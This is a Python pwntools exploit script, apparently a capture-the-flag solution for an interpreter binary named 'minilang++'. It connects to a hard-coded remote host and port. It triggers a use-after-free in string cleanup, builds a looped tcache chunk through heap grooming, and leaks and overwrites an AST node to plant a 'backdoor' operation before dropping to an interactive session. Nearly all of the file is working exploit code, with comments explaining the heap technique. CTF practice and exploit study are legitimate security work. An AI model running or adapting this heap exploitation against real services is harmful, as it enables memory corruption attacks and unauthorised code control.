#!/usr/bin/env python3
from pwn import *

SIZEOF_AST_BINARY_EXPR_NODE = 0x58


def connect():
    if args.LOCAL:
        if args.VALGRIND:
            return process(['valgrind', './minilang++'])
        else:
            return gdb.debug(['./minilang++'], api=True)
    else:
        return remote('69.90.132.248', 3137)


def prompt(tube):
    tube.recvuntil(b'>>> _\x08')


def main():
    with connect() as tube:
        if args.LOCAL and not args.VALGRIND:
            class Bp(tube.gdb.Breakpoint):
                def stop(self):
                    rdi = tube.gdb.parse_and_eval('$rdi')
                    print(f'ASTBinaryExprNode@{rdi}')

            Bp('_ZN6parser17ASTBinaryExprNodeC2ENSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEPNS_11ASTExprNodeES8_j')
            tube.gdb.continue_nowait()

        if False:
            allowed_chars = set(range(0, 256))
            allowed_chars.remove(0x0a)  # newline
            allowed_chars.remove(0x22)  # quote
            allowed_chars.remove(0xff)  # eof
            prompt(tube)
            tube.sendline(b'var test: string = "' + bytes(sorted(allowed_chars)) + b'";')
            prompt(tube)
            tube.sendline('print(test);')
            tube.interactive()

        # Create a regular and an optimized concatenation functions.
        prompt(tube)
        tube.sendline('def concat(x: string, y: string): string { return x + y; }')
        prompt(tube)
        tube.sendline('def concat_optimized(x: string, y: string): string { return x + y; }')
        prompt(tube)
        tube.sendline('var i: int = 0;')
        prompt(tube)
        tube.sendline('while (i < 1000) { var s: string = concat_optimized("", ""); set i = i + 1; }')

        # Create string variables for freeing into tcache later.
        max_ballast = 10
        ballast_val = flat({}, length=SIZEOF_AST_BINARY_EXPR_NODE - 1).decode()
        drop_ballast_val = flat(
            {},
            length=SIZEOF_AST_BINARY_EXPR_NODE * 2,
        ).decode()
        for i in range(max_ballast):
            prompt(tube)
            tube.sendline(f'var ballast{i}: string = "{ballast_val}";')
        cur_ballast = 0

        def drop_ballast():
            nonlocal cur_ballast
            prompt(tube)
            tube.sendline(f'set ballast{cur_ballast} = "{drop_ballast_val}";')
            cur_ballast += 1

        # Bug: CleanupValue() calls reserve(0) on a bitwise copy.
        concat_rhs = '!'
        # So that we end up creating a loop in tcache[0x60], where
        # ASTBinaryExprNodes live. There must be a formula based on how
        # std::string decides to expand its capacity, but I just found this
        # value experimentally.
        magic_delta = 0x30
        value = flat(
            {},
            # - 1 for std::string's trailing "\0".
            length=SIZEOF_AST_BINARY_EXPR_NODE - len(concat_rhs) - magic_delta - 1,
        ).decode()
        # Concatenate two non-empty strings so that concatenation result's
        # length != capacity. This will make bitwise_copy.reserve(0) trigger a
        # reallocation and l_value's buffer in Interpreter::visit() will point
        # to freed memory.
        prompt(tube)
        if args.LOCAL and not args.VALGRIND:
            tube.gdb.interrupt_and_wait()
            tube.gdb.Breakpoint(
                '*(&_ZN6parser17ASTBinaryExprNode4callEN7visitor2vTES2_ + 120)',
                temporary=True,
            )
            tube.gdb.continue_nowait()
        tube.sendline(f'concat_optimized("{value}", "{concat_rhs}")')
        if args.LOCAL and not args.VALGRIND:
            tube.gdb.wait()
            tube.gdb.continue_nowait()

        # The buffer of s will be in the looped tcache chunk.
        for i in range(2):
            drop_ballast()
        prompt(tube)
        if args.LOCAL and not args.VALGRIND:
            tube.gdb.interrupt_and_wait()
            print(tube.gdb.execute('heap bins', False, True))
            tube.gdb.continue_nowait()
        tube.sendline(f'var s: string = ballast{max_ballast - 1};')

        # pwn2's ASTBinaryExprNode will overlap the buffer of s.
        prompt(tube)
        tube.sendline('def pwn0(): int { return 1 + 1; }')
        prompt(tube)
        tube.sendline('1 + 1')
        prompt(tube)
        tube.sendline('def pwn1(): int { return 1 + 1; }')
        prompt(tube)
        tube.sendline('def pwn2(): int { return 1 + 1; }')

        # Leak pwn2's ASTBinaryExprNode.
        drop_ballast()
        prompt(tube)
        if args.LOCAL and not args.VALGRIND:
            tube.gdb.interrupt_and_wait()
            print(tube.gdb.execute('heap bins', False, True))
            tube.gdb.continue_nowait()
        tube.sendline('print(s);')
        pwn2_bytes = bytearray(tube.recvn(SIZEOF_AST_BINARY_EXPR_NODE))

        # Overwrite pwn2's ASTBinaryExprNode.
        backdoor = b'backdoor'
        pwn2_bytes[0x20:0x28] = struct.pack('<Q', len(backdoor))
        pwn2_bytes[0x28:0x28 + len(backdoor)] = backdoor
        pwn2_bytes[0x28 + len(backdoor)] = 0
        pwn2_bytes = pwn2_bytes[:-1]
        pwn2_bytes = pwn2_bytes.replace(b'\n', b'\\n')
        pwn2_bytes = pwn2_bytes.replace(b'"', b'\\"')
        assert b'{' not in pwn2_bytes
        assert b'}' not in pwn2_bytes
        assert b'\xff' not in pwn2_bytes
        for _ in range(5):
            drop_ballast()
        prompt(tube)
        if args.LOCAL and not args.VALGRIND:
            tube.gdb.interrupt_and_wait()
            print(tube.gdb.execute('heap bins', False, True))
            tube.gdb.continue_nowait()
        tube.sendline(b'set s = "' + pwn2_bytes + b'";')

        tube.interactive()


if __name__ == '__main__':
    main()
